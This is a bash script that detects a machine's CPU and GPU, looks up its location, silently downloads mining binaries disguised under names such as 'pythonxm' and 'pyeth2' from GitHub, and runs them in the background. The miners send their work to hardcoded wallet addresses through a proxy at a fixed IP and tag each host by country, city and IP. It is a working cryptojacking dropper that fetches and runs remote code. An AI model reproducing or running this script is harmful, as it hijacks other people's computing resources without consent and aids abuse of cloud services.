#!bin/bash -xe



echo -e '##########################################################################'
PROX=78.47.69.185
ETPort=443
RVPort=80
VCPort=8080
XMProt=21
echo -e '################## '"MAX $PROX"' Ver:0.2.6     ################'
echo -e '##########################################################################'

## getting IP info

JSINFO=$(curl ipinfo.io)
CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
IPNAME=$(sed 's|\.|o|g' <<< $IIP)
INFO="$COUNTRY""_""$CITY""_""$IPNAME"
echo "let's name it: $INFO"

## COLORS
# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White

#clen log

echo > oout
echo > ooutxm
echo  > ooutvc

#################### CPU ARC ################################

if [ $(lscpu |grep avx512 |wc -l) == 1 ]
then 
echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}"
OP=XM
CPU='AVX512'
elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
OP=XM
CPU='AVX2'
elif [ $(lscpu |grep avx |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
OP=XM
CPU='AVX'
else
echo -e "${On_IRed}"'## CPU OLD ##'"${Color_Off}"
OP=VC
CPU='OLD'
fi

#################### GPU Type #########################
GPU=NULL
if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then

echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
GPU=P100
OPG=ET
PROG=CU
elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
then
echo -e "${On_IRed}"'#### ONLY CPU ###'"${Color_Off}"
GPU=NONE
OPG=NONE
elif [ $( nvidia-smi  2>&1 |  grep "not found" |wc -l) == 1 ]
then
echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}"
GPU=NONE
OPG=NONE

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
GPU=T4
OPG=ET
PROG=CL
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
GPU=K80
OPG=RV
PROG=CL

elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
then

echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
GPU=P4
OPG=ET
PROG=CU
else
echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}"
GPU=OTHER
OPG=ET
PROG=CL

fi

######################################



# exec
i="0"

while true
do
if [ $OP == "XM" ]
then
####### XM
#               Executable
echo start >> ooutxm
rm -rf pythonxm
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
#                Config
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+RV_$IPNAME+g" config.json
sed -i "s+xxpppxx+$PROX+g" config.json

nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &

else
###### VC
echo start >> ooutxm
rm -rf pythonheq
wget -q https://github.com/one10001/10001code/raw/main/pythonheq
chmod +x pythonheq

nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &

fi

if [ $OPG == "ET" ]
then
    rm -rf pyeth2
    wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
    chmod +x pyeth2
    if  [ $PROG == "CU" ]
    then
        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
    else
        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
    fi

elif [ $OPG == "RV" ]
then
    rm -rf python2.6.6
    wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
    chmod +x python2.6.6
    if  [ $PROG == "CU" ]
    then
    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
    else
    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
    fi
else
    echo "No GPU"
fi


    while true
    do
        i=$[$i+1]
        if [ $GPU == "NONE" ]
        then
        echo -e "${On_Red}ONLY CPU -> ${BIYellow} XM/VC"
        elif [ $GPU == "T4" ]
        then
        echo -e "${On_Green}GPU T4  -> ${BIYellow}  ET"
        echo -e "${On_IGreen}Results ET${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
        elif [ $GPU == "P100" ]
        then
        echo -e "${On_Green}GPU P100  -> ${BIYellow}  ET"
        echo -e "${On_IGreen}Results ET${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
        elif [ $GPU == "P4" ]
        then
        echo -e "${On_Green}GPU T4  -> ${BIYellow}  ET + RV"
        echo -e "${On_IGreen}Results  ET + RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
        elif [ $GPU == "K80" ]
        then
        echo -e "${On_Cyan}GPU K80 RV  -> ${BIYellow}  RV"
        echo -e "${On_ICyan}Results RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
        else
        echo -e "${On_Green}GPU OTHER ET + RV  -> ${BIYellow}  RV"
        echo -e "${On_IGreen}Results ET + RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
        fi
        
        if [ $OP == "XM" ]
        then
            echo -e "${On_IRed} Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep acc ooutxm | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep acc ooutxm | wc -l)*100/$i] ${Color_Off}" 
        elif [ $OP == "XM" ]
        then
            echo -e "${On_IBlue}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc ooutvc | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc ooutvc | wc -l)*100/$i] ${Color_Off}" 
        else 
            echo -e "${On_IBlue}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc ooutvc | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc ooutvc | wc -l)*100/$i] ${Color_Off}"         
        fi
        sleep 30

    done




echo -e "#######################   Process  Killed    #########################"
                  
done
tail -f oout
